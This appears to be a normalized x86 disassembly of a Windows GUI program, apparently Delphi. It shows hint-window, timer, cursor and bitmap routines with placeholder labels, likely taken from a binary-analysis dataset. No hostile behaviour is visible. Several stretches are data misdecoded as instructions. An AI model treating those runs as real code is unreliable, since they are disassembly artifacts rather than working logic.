mov eax [ ebp - 0x4 ]
call sub_458b24
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_456bd4
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_435ba4
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_458d5c
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push sub_458c53
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x102 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
mov eax [ ebp - 0x4 ]
call sub_4590f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_458ac0
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_418fac
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458cb3
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fb4
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
sub_458cbc
push ebx
push esi
push edi
mov edi edx
mov eax [ rw-data ]
call sub_456050
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ rw-data ]
call sub_45603c
movzx edx di
xor ecx ecx
call sub_439bf4
inc esi
dec ebx
jne r-xdata
sub_458cf8
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_457e14
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_457e14
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
jmp r-xdata
mov dx 0xb01d
mov eax ebx
call sub_458cbc
pop ebx
retn
push 0xffffffff
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call InvalidateRect
sub_458d5c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x54 ]
mov edx esi
call sub_40439c
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
lea eax [ ebx + 0x54 ]
mov edx esi
call sub_403fe4
cmp [ ebx + 0xfa ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_432650
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4454e4
xor eax eax
push ebp
push sub_458de1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403454
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403258
retn
mov edx ebx
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
jmp r-xdata
sub_458df0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
cmp al [ rw-data ]
jne r-xdata
pop ebx
pop ebp
retn
cmp bl [ rw-data ]
je r-xdata
xor eax eax
mov al bl
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
mov [ rw-data ] bl
sub_458e4c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_456050
mov esi eax
dec esi
test esi esi
jl r-xdata
push ebp
xor eax eax
call sub_458df0
pop ecx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45603c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_458df0
pop ecx
jmp r-xdata
mov eax ebx
call sub_43f52c
test al al
jne r-xdata
mov eax [ ebx + 0x190 ]
push eax
mov eax ebx
call sub_43f228
push eax
call IsChild
test eax eax
jne r-xdata
sub_458ed4
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x4c ] 0x0
jne r-xdata
cmp [ esi + 0x4c ] 0x0
je r-xdata
lea eax [ esi + 0x4c ]
call sub_4055cc
call sub_422f00
mov eax ebx
pop esi
pop ebx
retn
mov bl 0x1
sub_458efc
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov eax edi
call sub_458f40
push sub_456c2c
push esi
push 0x0
push 0x0
call SetTimer
mov [ edi + 0x8a ] ax
mov [ edi + 0x89 ] bl
cmp [ edi + 0x8a ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4590f4
sub_458f68
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebp ecx
mov edi edx
mov esi eax
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_4068a0
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_438558
lea eax [ esp + 0x10 ]
mov dl 0x1
call sub_4372ec
call sub_456c0c
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_4590f4
jmp r-xdata
cmp [ ebx + 0x99 ] 0x0
jne r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebx [ esi + 0x60 ]
jne r-xdata
mov al [ esi + 0x58 ]
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_4068a0
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_438558
push [ esp + 0x14 ]
push [ esp + 0x14 ]
lea eax [ esi + 0x64 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esi + 0x78 ]
mov [ esp ] eax
mov eax [ esi + 0x80 ]
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_4590f4
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
xor ecx ecx
mov edx [ esp ]
mov eax esi
call sub_458efc
cmp [ esp ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov cl [ esp + 0x8 ]
mov edx 0xb041
mov eax ebx
call sub_439bf4
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
lea eax [ esp + 0x5 ]
push eax
call GetCursorPos
lea edx [ esp + 0x5 ]
mov eax esi
call sub_45938c
jmp r-xdata
sub_459078
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_458f40
mov al [ ebx + 0x89 ]
sub al 0x1
jb r-xdata
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_45938c
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_4590b0
jmp r-xdata
sub_4590b0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x84 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_43f52c
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_43f228
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax [ ebx + 0x84 ]
call sub_43f228
push eax
call ShowWindow
sub_4590f4
push ebx
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_4590b0
xor eax eax
mov [ ebx + 0x60 ] eax
mov [ ebx + 0x58 ] 0x0
call sub_456d94
mov eax ebx
call sub_458f40
sub_45912c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call GetCursor
push eax
call GetIconInfo
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push sub_45926e
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_41e6b4
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
call sub_4079e8
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_45923f
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x8 ]
push ebx
mov esi [ ebp - 0x10 ]
mov ecx esi
xor edx edx
mov eax [ ebp - 0x1c ]
call sub_41e76c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459246
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_4026dc
retn
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xe ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx eax
movzx ecx [ esi + 0xe ]
imul edx ecx
add edx 0x1f
and edx 0xffffffe0
test edx edx
jns r-xdata
sar edx 0x3
mov [ ebp - 0x14 ] edx
mov edi eax
imul edi [ ebp - 0x14 ]
add ebx [ ebp - 0xc ]
sub ebx edi
mov ecx 0xff
mov edx edi
mov eax ebx
call sub_45911c
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add edx 0x7
mov eax [ ebp - 0x4 ]
cdq
idiv [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x20 ]
sub [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
add edx edx
cmp eax edx
jl r-xdata
mov eax ebx
sub eax edi
xor ecx ecx
mov edx edi
call sub_45911c
mov [ ebp - 0x4 ] eax
sub_459246
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push eax
call DeleteObject
retn
push eax
call DeleteObject
sub_459280
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_403258
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x84 ] eax
mov eax [ ebp + 0x8 ]
mov eax esi
call sub_4031a0
cmp ebx eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_4592e0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_45937a
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459381
lea eax [ ebp - 0x8 ]
call sub_403f90
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov esi ebx
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_404080
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x8 ]
call sub_41d298
cmp eax [ ebp - 0x4 ]
jle r-xdata
sub al 0xa
je r-xdata
cmp [ ebx ] 0xd
jne r-xdata
mov [ ebp - 0x4 ] eax
sub al 0x3
jne r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
mov eax ebx
call sub_40be68
mov ebx eax
inc ebx
sub_45938c
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x90 ] ecx
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_4048fc
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_459712
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov [ eax + 0x58 ] 0x0
mov eax [ ebx ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_4590f4
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_458efc
jmp r-xdata
call sub_44f5bc
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459719
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_403fb4
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_4049c0
retn
lea eax [ ebp - 0xc ]
mov dl 0x1
call sub_4372ec
call sub_456c0c
mov edx [ ebx ]
cmp eax [ edx + 0x60 ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x54 ] eax
call sub_45912c
add [ ebp - 0x54 ] eax
mov eax [ rw-data ]
call sub_455fd0
mov [ ebp - 0x50 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0x4c ] eax
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_4383e0
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x14 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x60 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call OffsetRect
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0xc ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_438584
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x34 ] eax
lea edx [ ebp - 0x90 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_456bd4
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_435b60
mov edx [ ebp - 0x8c ]
lea eax [ ebp - 0x28 ]
call sub_404028
xor eax eax
mov [ ebp - 0x30 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebp - 0x2c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
xor ecx ecx
mov edx 0xb030
call sub_439bf4
test eax eax
sete [ ebp - 0x1d ]
cmp [ ebp - 0x1d ] 0x0
je r-xdata
cmp [ esi + 0x190 ] 0x0
je r-xdata
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x190 ]
push eax
call ClientToScreen
xor eax eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x1d ]
lea edx [ ebp - 0x28 ]
mov esi [ ebx ]
mov eax [ esi + 0x134 ]
call [ esi + 0x130 ]
mov edx [ ebx ]
mov [ edx + 0x58 ] al
mov eax [ ebx ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x5c ]
call sub_459280
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov dl [ eax + 0x5f ]
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x50 ]
mov esi [ eax ]
call [ esi + 0xd8 ]
mov eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
call OffsetRect
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov si 0xffc8
call sub_403454
test al al
je r-xdata
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x48 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_438558
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x64 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x68 ] edx
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_438558
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x6c ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x70 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x4c ]
call sub_438be0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
lea edx [ ebp - 0x70 ]
mov esi [ eax ]
call [ esi + 0xd4 ]
call sub_456d20
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
push ebp
mov eax [ ebp - 0x28 ]
call sub_4592e0
pop ecx
add eax 0x5
sub [ ebp - 0x70 ] eax
sub [ ebp - 0x68 ] eax
mov cl 0x1
mov edx [ ebp - 0x2c ]
mov eax [ ebx ]
call sub_458efc
jmp r-xdata
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_458efc
jmp r-xdata
sub_459720
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ rw-data ]
mov ebx [ eax + 0x68 ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ esi + 0x50 ]
call sub_403fe4
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax edi
mov edx [ ebx + 0x23c ]
call sub_403fe4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_459780
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov [ ebx + 0xb0 ] esi
pop esi
pop ebx
retn
push esi
push 0x0
push 0xb031
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
sub_4597ac
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx ecx
mov [ esp ] edx
mov esi eax
mov eax [ rw-data ]
mov edi [ eax + 0x6c ]
test edi edi
je r-xdata
mov ebp [ esi + 0x44 ]
cmp edi ebp
je r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax edi
call sub_439bf4
dec eax
je r-xdata
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
mov al 0x1
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax ebp
call sub_439bf4
dec eax
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
cmp [ ebx + 0x42 ] 0x0
setne dl
mov eax ebx
call sub_4453ac
sub_45983c
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_459864
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xca ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_459908
add [ eax ] eax
add [ eax ] al
pop esp
jge r-xdata
cmc
inc esp
add al ch
sbb [ ecx - 0x3fcc0005 ] 0x5a
add [ ecx + edx * 2 + 0x43 ] ah
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_45996b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459972
retn
xor eax eax
pop edx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_44f368
mov eax sub_44f5e8
call sub_4132e0
mov eax [ rw-data ]
push eax
call CloseHandle
sub_45a498
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
add [ eax ] al
or [ ecx ] 0xb
dec edi
inc ebp
add [ eax + eax ] cl
add [ eax ] al
mov al [ 0xffffffff88004010 ]
xor al 0x40
add [ esp + esi + 0x34980040 ] dl
inc eax
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
inc eax
add [ eax - 0x63ffbfcc ] bl
xor al 0x40
add [ eax - 0xfffbfcc ] dl
jb r-xdata
add eax [ eax ]
add [ eax ] al
push edi
jb r-xdata
add [ eax + 0x32 ] cl
inc eax
add [ eax ] bl
push esp
inc ebx
push 0x4c6b6365
imul esi [ ebx + 0x74 ] 0x44786f42
inc esp
outsd
arpl [ ebx - 0x10 ] bp
inc ebx
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b004a ] al
mov [ fs : eax ] edx
add [ ecx - 0x275c0609 ] bl
fwait
inc esi
add [ ebx ] dh
rcr [ edx + 0x59 ] 0x59
jo r-xdata
outsd
js r-xdata
jb r-xdata
push sub_45a57c
mov eax [ ebp - 0x4 ]
call sub_403258
retn
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
test eax eax
jns r-xdata
popad
je r-xdata
add [ ecx + r-xdata ] esp
inc esp
jb r-xdata
outsb
push ebx
je r-xdata
call sub_41fb30
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45a575
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x7ff7
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_420cf8
inc eax
add [ ebp - 0x75 ] dl
in al dx
push ecx
mov dl 0x1
mov eax [ r-xdata ]
cdq
idiv ecx
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
sar eax 0x2
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov ecx 0x3
add eax 0x3
popad
lea eax [ bx + si ]
loopne r-xdata
add [ ecx ] cl
dec edi
outsb
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
movsb [ edi ] [ esi ]
push ebp
jo r-xdata
dec ebp
outsd
jne r-xdata
outsb
push ebx
je r-xdata
inc eax
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0049 ] al
sub_45a4fc
push ebp
mov ebp esp
push ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fb30
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45a575
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x7ff7
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_420cf8
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
test eax eax
jns r-xdata
sar eax 0x2
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov ecx 0x3
cdq
idiv ecx
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a57c
mov eax [ ebp - 0x4 ]
call sub_403258
retn
add eax 0x3
sub_45a5a4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_430e54
mov [ esi + 0x281 ] 0x1
mov [ esi + 0x294 ] 0xff000017
mov [ esi + 0x298 ] 0xff000018
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax esi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_45a5f4
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov eax [ esi + 0x290 ]
call sub_403258
mov edx ebx
and dl 0xfc
mov eax esi
call sub_430f40
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_45a624
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov eax ebx
call sub_431a0c
mov eax [ ebx + 0x290 ]
test eax eax
je r-xdata
mov eax ebx
call sub_45a744
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
lea eax [ ebx + 0x290 ]
call sub_40cb64
inc eax
mov [ esp ] eax
xor esi esi
mov edx esi
mov eax ebx
call sub_45aec8
mov edi eax
mov edx esi
mov eax [ ebx + 0x290 ]
call sub_4137ac
mov ebp eax
mov eax ebp
call sub_45a594
mov [ edi + 0x8 ] al
mov eax ebp
call sub_45a598
mov [ edi + 0x9 ] al
inc esi
dec [ esp ]
jne r-xdata
sub_45a698
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_431adc
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebx + 0x290 ] eax
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
mov edx esi
mov eax ebx
call sub_45acb4
xor al 0x1
push eax
mov edx esi
mov eax ebx
call sub_45ace0
pop edx
call sub_45a580
mov edx eax
mov eax [ ebx + 0x290 ]
call sub_413650
inc esi
dec edi
jne r-xdata
sub_45a744
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_43f52c
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x238 ] 0x0
jne r-xdata
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x228 ]
call sub_41d358
mov edx r-xdata
mov eax [ ebx + 0x228 ]
call sub_41d2b4
mov esi eax
mov [ ebx + 0x284 ] esi
push esi
xor ecx ecx
mov edx 0x1a0
mov eax ebx
